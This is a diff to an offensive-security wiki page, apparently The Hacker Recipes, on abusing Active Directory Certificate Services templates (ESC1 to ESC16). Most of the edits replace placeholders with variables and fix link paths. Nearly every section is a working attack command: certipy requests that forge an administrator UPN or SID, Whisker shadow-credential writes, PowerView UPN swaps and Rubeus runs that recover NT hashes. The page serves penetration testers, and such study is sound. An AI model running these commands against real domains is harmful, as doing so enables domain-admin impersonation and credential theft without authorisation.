@@ -146,16 +146,16 @@ Once a vulnerable template is found ([how to enumerate](./#attack-paths)), a req
 
 ```bash
 #To specify a user account in the SAN
-certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca 'ca_name' -template 'vulnerable template' -upn 'domain admin'
+certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca "$CA_NAME" -template "$TEMPLATE" -upn 'domain admin'
 
 #To specify a computer account in the SAN
-certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca 'ca_name' -template 'vulnerable template' -dns 'dc.domain.local'
+certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca "$CA_NAME" -template "$TEMPLATE" -dns "$DC_HOST"
 ```
 
 > [!WARNING]
 > The `$ADCS_HOST` target must be a FQDN (not an IP).
 
-The certificate can then be used with [Pass-the-Certificate](../kerberos/pass-the-certificate.md) to obtain a TGT and authenticate.
+The certificate can then be used with [Pass-the-Certificate](../kerberos/pass-the/pass-the-certificate.md) to obtain a TGT and authenticate.
 
 > [!TIP]
 > By default, Certipy uses LDAPS, which is not always supported by the domain controllers. The `-scheme` flag can be used to set whether to use LDAP or LDAPS.
@@ -181,7 +181,7 @@ Once a vulnerable template is found, a request shall be made to obtain a certifi
 Certify.exe request /ca:'domain\ca' /template:"Vulnerable template" /altname:"admin"
 ```
 
-The certificate can then be used with [Pass-the-Certificate](../kerberos/pass-the-certificate.md) to obtain a TGT and authenticate.
+The certificate can then be used with [Pass-the-Certificate](../kerberos/pass-the/pass-the-certificate.md) to obtain a TGT and authenticate.
 
 :::
 
@@ -207,13 +207,13 @@ certipy find -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -vulnerable
 Once a vulnerable template is found ([how to enumerate](./#attack-paths)), a request shall be made to obtain a certificate specifying the Certificate Request Agent EKU.
 
 ```bash
-certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca 'ca_name' -template 'vulnerable template'
+certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca "$CA_NAME" -template "$TEMPLATE"
 ```
 
 Then, the issued certificate can be used to request another certificate permitting `Client Authentication` on behalf of another user.
 
 ```bash
-certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca 'ca_name' -template 'User' -on-behalf-of 'domain\domain admin' -pfx 'user.pfx'
+certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca "$CA_NAME" -template 'User' -on-behalf-of 'domain\domain admin' -pfx 'user.pfx'
 ```
 
 > [!TIP]
@@ -261,7 +261,7 @@ Here are the requirements to perform ESC9:
 * `GenericWrite` right against any account A to compromise any account B
 
 > [!WARNING]
-> Acate can then be used with to obtain a TGT and authenticat the time of writting (06/08/2022), there is no solution as a low privileged user to read the `StrongCertificateBindingEnforcement` or the `CertificateMappingMethods` values. It is worth to try the attack hopping the keys are misconfigured.
+> At the time of writing (06/08/2022), there is no solution as a low privileged user to read the `StrongCertificateBindingEnforcement` or the `CertificateMappingMethods` values. It is worth trying the attack hoping the keys are misconfigured.
 
 ::: tabs
 
@@ -286,7 +286,7 @@ certipy account update -username "user1@$DOMAIN" -p "$PASSWORD" -user user2 -upn
 The vulnerable certificate can be requested as user2.
 
 ```bash
-certipy req -username "user2@$DOMAIN" -hashes "$NT_HASH" -target "$ADCS_HOST" -ca 'ca_name' -template 'vulnerable template'
+certipy req -username "user2@$DOMAIN" -hashes "$NT_HASH" -target "$ADCS_HOST" -ca "$CA_NAME" -template "$TEMPLATE"
 ```
 
 The user2's UPN is changed back to something else.
@@ -318,7 +318,7 @@ Here, user1 has `GenericWrite` against user2 and want to compromise user3. user2
 First, the user2's credentials are needed. It can be retrieved via a [Shadow Credentials](../kerberos/shadow-credentials.md) attack, for example. Here just the `msDs-KeyCredentialLink` modification part with [Whisker](https://github.com/eladshamir/Whisker):
 
 ```powershell
-Whisker.exe add /target:"user2" /domain:"domain.local" /dc:"DOMAIN_CONTROLLER" /path:"cert.pfx" /password:"pfx-password"
+Whisker.exe add /target:"user2" /domain:"$DOMAIN" /dc:"$DC_HOST" /path:"cert.pfx" /password:"pfx-password"
 ```
 
 Then, the `userPrincipalName` of user2 is changed to user3 with [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1).
@@ -342,7 +342,7 @@ Set-DomainObject user2 -Set @{'userPrincipalName'='user2@dmain.local'} -Verbose
 Now, authenticating with the obtained certificate will provide the user3's NT hash during [UnPac the hash](../kerberos/unpac-the-hash.md). This action can be realised with [Rubeus](https://github.com/GhostPack/Rubeus). The domain must be specified since it is not present in the certificate.
 
 ```powershell
-Rubeus.exe asktgt /getcredentials /certificate:"BASE64_CERTIFICATE" /password:"CERTIFICATE_PASSWORD" /domain:"domain.local" /dc:"DOMAIN_CONTROLLER" /show
+Rubeus.exe asktgt /getcredentials /certificate:"BASE64_CERTIFICATE" /password:"CERTIFICATE_PASSWORD" /domain:"$DOMAIN" /dc:"$DC_HOST" /show
 ```
 
 :::
@@ -386,7 +386,7 @@ certipy account update -username "user1@$DOMAIN" -p "$PASSWORD" -user user2 -upn
 A certificate permitting client authentication can be requested as user2.
 
 ```bash
-certipy req -username "user2@$DOMAIN" -hashes "$NT_HASH" -ca 'ca_name' -template 'User'
+certipy req -username "user2@$DOMAIN" -hashes "$NT_HASH" -ca "$CA_NAME" -template 'User'
 ```
 
 The user2's UPN is changed back to something else.
@@ -421,7 +421,7 @@ Here, user1 has `GenericWrite` against user2 and want to compromise user3.
 First, the user2's credentials are needed. It can be retrieved via a [Shadow Credentials](../kerberos/shadow-credentials.md) attack, for example. Here just the `msDs-KeyCredentialLink` modification part with [Whisker](https://github.com/eladshamir/Whisker):
 
 ```powershell
-Whisker.exe add /target:"user2" /domain:"domain.local" /dc:"DOMAIN_CONTROLLER" /path:"cert.pfx" /password:"pfx-password"
+Whisker.exe add /target:"user2" /domain:"$DOMAIN" /dc:"$DC_HOST" /path:"cert.pfx" /password:"pfx-password"
 ```
 
 Then, the `userPrincipalName` of user2 is changed to user3 with [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1).
@@ -445,7 +445,7 @@ Set-DomainObject user2 -Set @{'userPrincipalName'='user2@dmain.local'} -Verbose
 Now, authenticating with the obtained certificate will provide the user3's NT hash during [UnPac the hash](../kerberos/unpac-the-hash.md). This action can be realised with [Rubeus](https://github.com/GhostPack/Rubeus). The domain must be specified since it is not present in the certificate.
 
 ```powershell
-Rubeus.exe asktgt /getcredentials /certificate:"BASE64_CERTIFICATE" /password:"CERTIFICATE_PASSWORD" /domain:"domain.local" /dc:"DOMAIN_CONTROLLER" /show
+Rubeus.exe asktgt /getcredentials /certificate:"BASE64_CERTIFICATE" /password:"CERTIFICATE_PASSWORD" /domain:"$DOMAIN" /dc:"$DC_HOST" /show
 ```
 
 :::
@@ -482,7 +482,7 @@ certipy account update -username "user1@$DOMAIN" -p "$PASSWORD" -user user2 -upn
 A certificate permitting client authentication can be requested as user2.
 
 ```bash
-certipy req -username "user2@$DOMAIN" -hashes "$NT_HASH" -ca 'ca_name' -template 'User'
+certipy req -username "user2@$DOMAIN" -hashes "$NT_HASH" -ca "$CA_NAME" -template 'User'
 ```
 
 The user2's UPN is changed back to something else.
@@ -517,13 +517,13 @@ Here, user1 has `GenericWrite` against user2 and want to compromise the domain c
 First, the user2's credentials are needed. It can be retrieved via a [Shadow Credentials](../kerberos/shadow-credentials.md) attack, for example. Here just the `msDs-KeyCredentialLink` modification part with [Whisker](https://github.com/eladshamir/Whisker):
 
 ```powershell
-Whisker.exe add /target:"user2" /domain:"domain.local" /dc:"DOMAIN_CONTROLLER" /path:"cert.pfx" /password:"pfx-password"
+Whisker.exe add /target:"$TARGET_USER" /domain:"$DOMAIN" /dc:"$DC_HOST" /path:"cert.pfx" /password:"pfx-password"
 ```
 
 Then, the `userPrincipalName` of user2 is changed to DC$@domain.local with [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1).
 
 ```powershell
-Set-DomainObject user2 -Set @{'userPrincipalName'='DC$@domain.local'} -Verbose
+Set-DomainObject user2 -Set @{'userPrincipalName'='DC$@$DOMAIN'} -Verbose
 ```
 
 A certificate permitting client authentication can be requested in a user2 session.
@@ -567,16 +567,16 @@ To exploit ESC13, here are the requirements:
 From UNIX-like systems, this [pull request](https://github.com/ly4k/Certipy/pull/196) on Certipy (Python) permits to identify a certificate template with an issuance policy, i.e. with the `msPKI-Certificate-Policy` property not empty. Additionally, it verifies if this issuance policy has an OID group link to a group in the property `msDS-OIDToGroupLink`.
 
 ```bash
-certipy find -u '$USER@$DOMAIN' -p '"$PASSWORD' -dc-ip '$DC_IP'
+certipy find -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP"
 ```
 
 If a vulnerable template is found, there is no particular issuance requirement, the principal can enroll, and the template indicates the Client Authentication EKU, request a certificate for this template with [Certipy](https://github.com/ly4k/Certipy) (Python) as usual:
 
 ```bash
-certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca 'ca_name' -template 'Vulnerable template'
+certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca "$CA_NAME" -template "$TEMPLATE"
 ```
 
-The certificate can then be used with [Pass-the-Certificate](../kerberos/pass-the-certificate.md) to obtain a TGT and authenticate as the controlled principal, but with its privileges added to those of the linked group.
+The certificate can then be used with [Pass-the-Certificate](../kerberos/pass-the/pass-the-certificate.md) to obtain a TGT and authenticate as the controlled principal, but with its privileges added to those of the linked group.
 
 
 === Windows
@@ -599,7 +599,7 @@ Now, request a certificate for this template with [Certify](https://github.com/G
 .\Certify.exe request /ca:domain\ca /template:"Vulnerable template"
 ```
 
-The certificate can then be used with [Pass-the-Certificate](../kerberos/pass-the-certificate.md) to obtain a TGT and authenticate as the controlled principal, but with its privileges added to those of the linked group.
+The certificate can then be used with [Pass-the-Certificate](../kerberos/pass-the/pass-the-certificate.md) to obtain a TGT and authenticate as the controlled principal, but with its privileges added to those of the linked group.
 
 :::
 
@@ -704,7 +704,7 @@ For PKINIT authentication, no additional requirements are necessary. For Schanne
 From UNIX-like systems, with [certipy](https://github.com/ly4k/Certipy), it is possible to enroll on a certificate template.
 
 ```bash
-certipy req -u $TARGET@$DOMAIN -ca $CA_NAME -template $TEMPLATE -dc-ip $DC_IP
+certipy req -u $VICTIM@$DOMAIN -ca $CA_NAME -template $TEMPLATE -dc-ip $DC_IP
 ```
 
 Then, using [certipy](https://github.com/ly4k/Certipy), we can get the certificate out of the pfx file.
@@ -754,7 +754,7 @@ conn.modify(
 conn.unbind()
 ```
 
-The certificate requested at the begining can then be used with [Pass-the-Certificate](../kerberos/pass-the-certificate.md) to obtain a TGT and authenticate as the target.
+The certificate requested at the begining can then be used with [Pass-the-Certificate](../kerberos/pass-the/pass-the-certificate.md) to obtain a TGT and authenticate as the target.
 
 The certificate mapping written can be cleaned with the following python script.
 
@@ -810,7 +810,7 @@ Add-AltSecIDMapping -DistinguishedName $TARGET_DN -MappingString $MAPPING_STRING
 Get-AltSecIDMapping -DistinguishedName $TARGET_DN
 ```
 
-The certificate requested at the begining can then be used with [Pass-the-Certificate](../kerberos/pass-the-certificate.md) to obtain a TGT and authenticate as the target.
+The certificate requested at the begining can then be used with [Pass-the-Certificate](../kerberos/pass-the/pass-the-certificate.md) to obtain a TGT and authenticate as the target.
 
 The certificate mapping written can be cleaned with [Remove-AltSecIDMapping](https://github.com/JonasBK/Powershell/blob/master/Remove-AltSecIDMapping.ps1) (PowerShell).
 
@@ -873,7 +873,7 @@ With [certipy](https://github.com/ly4k/Certipy), it is then possible to enroll o
 certipy req -u $VICTIM@$DOMAIN -ca $CA_NAME -template $TEMPLATE -dc-ip $DC_IP
 ```
 
-The certificate can then be used with [Pass-the-Certificate](../kerberos/pass-the-certificate.md) to obtain a TGT and authenticate as the target.
+The certificate can then be used with [Pass-the-Certificate](../kerberos/pass-the/pass-the-certificate.md) to obtain a TGT and authenticate as the target.
 
 === Windows
 
@@ -891,7 +891,7 @@ Then, [Certify](https://github.com/GhostPack/Certify) (C#) can be used to enroll
 Certify.exe request /ca:domain\ca /template:$TEMPLATE_MAIL
 ```
 
-The certificate can then be used with [Pass-the-Certificate](../kerberos/pass-the-certificate.md) to obtain a TGT and authenticate as the target.
+The certificate can then be used with [Pass-the-Certificate](../kerberos/pass-the/pass-the-certificate.md) to obtain a TGT and authenticate as the target.
 
 :::
 
@@ -953,7 +953,7 @@ With [certipy](https://github.com/ly4k/Certipy), it is then possible to enroll o
 certipy req -u $VICTIM@$DOMAIN -ca $CA_NAME -template $TEMPLATE -dc-ip $DC_IP
 ```
 
-The certificate can then be used with [Pass-the-Certificate](../kerberos/pass-the-certificate.md) to obtain a TGT and authenticate as the target.
+The certificate can then be used with [Pass-the-Certificate](../kerberos/pass-the/pass-the-certificate.md) to obtain a TGT and authenticate as the target.
 
 === Windows
 
@@ -961,7 +961,7 @@ From Windows systems, with PowerShell the `cn` attribute of the victim must be o
 
 ```powershell
 $victim = [ADSI]"LDAP://CN=$VICTIM,CN=Users,DC=domain,DC=local"
-$victim.Rename("CN=$TARGET.domain.local")
+$victim.Rename("CN=$TARGET.$DOMAIN")
 Get-ADUser $VICTIM
 ```
 
@@ -971,7 +971,7 @@ Then, [Certify](https://github.com/GhostPack/Certify) (C#) can be used to enroll
 Certify.exe request /ca:domain\ca /template:$TEMPLATE
 ```
 
-The certificate can then be used with [Pass-the-Certificate](../kerberos/pass-the-certificate.md) to obtain a TGT and authenticate as the target.
+The certificate can then be used with [Pass-the-Certificate](../kerberos/pass-the/pass-the-certificate.md) to obtain a TGT and authenticate as the target.
 
 :::
 
@@ -1032,7 +1032,7 @@ With [certipy](https://github.com/ly4k/Certipy), it is then possible to enroll o
 certipy req -u $VICTIM@$DOMAIN -ca $CA_NAME -template $TEMPLATE -dc-ip $DC_IP
 ```
 
-The certificate can then be used with [Pass-the-Certificate](../kerberos/pass-the-certificate.md) to obtain a TGT and authenticate as the target.
+The certificate can then be used with [Pass-the-Certificate](../kerberos/pass-the/pass-the-certificate.md) to obtain a TGT and authenticate as the target.
 
 
 === Windows
@@ -1051,7 +1051,7 @@ Then, [Certify](https://github.com/GhostPack/Certify) (C#) can be used to enroll
 Certify.exe request /ca:domain\ca /template:$TEMPLATE /machine
 ```
 
-The certificate can then be used with [Pass-the-Certificate](../kerberos/pass-the-certificate.md) to obtain a TGT and authenticate as the target.
+The certificate can then be used with [Pass-the-Certificate](../kerberos/pass-the/pass-the-certificate.md) to obtain a TGT and authenticate as the target.
 
 :::
 
@@ -1163,44 +1163,47 @@ certipy auth \
     -username 'administrator' -domain "$DOMAIN"
 ```
 
-The certificate can then be used with [Pass-the-Certificate](https://www.thehacker.recipes/ad/movement/kerberos/pass-the-certificate) to obtain a TGT and authenticate as the target.
+The certificate can then be used with [Pass-the-Certificate](https://www.thehacker.recipes/ad/movement/kerberos/pass-the/pass-the-certificate) to obtain a TGT and authenticate as the target.
 
 === Windows
 
 **Step 1: Update the victim account's UPN to the target administrator's**
 
 ```powershell
-Set-DomainObject victim -Set @{'userPrincipalName'='administrator'} -Verbose
+Set-DomainObject "$TARGET_USER" -Set @{'userPrincipalName'='administrator'} -Verbose
 ```
 
 **(Possibly) Retrieve the credential for the victim (NT Hash)**
 ```powershell
-Whisker.exe add /target:"victim" /domain:"DOMAIN" /dc:"DOMAIN_CONTROLLER" /path:"cert.pfx" /password:"pfx-password"
+Whisker.exe add /target:"$TARGET_USER" /domain:"$DOMAIN" /dc:"$DC_HOST" /path:"cert.pfx" /password:"pfx-password"
 ```
 
 **Step 2: Request the certificate as the victim user from a suitable authentication template**
 
 ```powershell
-Certify.exe request /ca:'domain\ca' /template:"Vulnerable template"
+Certify.exe request /ca:'domain\ca' /template:"$TEMPLATE$"
 ```
 
 **Step 3: Revert the victim account's UPN**
 
 ```powershell
-Set-DomainObject victim -Set @{'userPrincipalName'='victim@corp.local'} -Verbose
+Set-DomainObject victim -Set @{'userPrincipalName'='$USER@corp.local'} -Verbose
 ```
 
 **Step 4: Authenticate as the target account**
 
 ```powershell
-Rubeus.exe asktgt /getcredentials /certificate:"BASE64_CERTIFICATE" /password:"CERTIFICATE_PASSWORD" /domain:"DOMAIN" /dc:"DOMAIN_CONTROLLER" /show
+Rubeus.exe asktgt /getcredentials /certificate:"BASE64_CERTIFICATE" /password:"CERTIFICATE_PASSWORD" /domain:"$DOMAIN" /dc:"$DC_HOST" /show
 ```
 
-The certificate can then be used with [Pass-the-Certificate](https://www.thehacker.recipes/ad/movement/kerberos/pass-the-certificate) to obtain a TGT and authenticate as the target.
+The certificate can then be used with [Pass-the-Certificate](https://www.thehacker.recipes/ad/movement/kerberos/pass-the/pass-the-certificate) to obtain a TGT and authenticate as the target.
 
 :::
 
 #### (ESC16 B) Full enforcement
+
+> [!WARNING]
+> **This chain is not exploitable under full enforcement (`StrongCertificateBindingEnforcement = 2`).** Per SpecterOps research, under full enforcement the KDC requires a valid `szOID_NTDS_CA_SECURITY_EXT` SID extension that matches the impersonated principal. A CA vulnerable to ESC16 globally disables that security extension — meaning no valid SID can be embedded in issued certificates — so the KDC will reject authentication. The ESC16 + ESC6 combination described below only bypasses compatibility mode (value `0` or `1`), not full enforcement.
 
 In this scenario, the DC's `StrongCertificateBindingEnforcement` attribute is set to `2`, meaning the KDC will verify the SID present in the certificate's security extension. 
 If the CA is vulnerable to ESC6, the SID can be manipulated directly in the SAN field of the certificate request, bypassing the enforcement policy.
@@ -1220,7 +1223,7 @@ From UNIX-like systems, [Certipy](https://github.com/ly4k/Certipy) can be used t
 certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$TARGET" -ca "$CA" -template "User" -upn "administrator@$DOMAIN" -sid "$ADMIN_SID"
 ```
 
-The certificate can then be used with [Pass-the-Certificate](https://www.thehacker.recipes/ad/movement/kerberos/pass-the-certificate) to obtain a TGT and authenticate as the target.
+The certificate can then be used with [Pass-the-Certificate](https://www.thehacker.recipes/ad/movement/kerberos/pass-the/pass-the-certificate) to obtain a TGT and authenticate as the target.
 
 > [!NOTE]
 > * In the case where `StrongCertificateBindingEnforcement` is set to `0` or `1`, only the `UPN` must be modified in the `SAN`.
@@ -1233,7 +1236,7 @@ From Windows, [Certify](https://github.com/GhostPack/Certify) can be used to req
 ./Certify.exe request /ca:SERVER\CA /template:User /altname:administrator /url:tag:microsoft.com,2007-09-14:sid:<ADMINISTRATOR_SID>
 ```
 
-The certificate can then be used with [Pass-the-Certificate](https://www.thehacker.recipes/ad/movement/kerberos/pass-the-certificate) to obtain a TGT and authenticate as the target.
+The certificate can then be used with [Pass-the-Certificate](https://www.thehacker.recipes/ad/movement/kerberos/pass-the/pass-the-certificate) to obtain a TGT and authenticate as the target.
 
 > [!NOTE]
 > * In the case where `StrongCertificateBindingEnforcement` is set to `0` or `1`, only the `UPN` must be modified in the `SAN`.
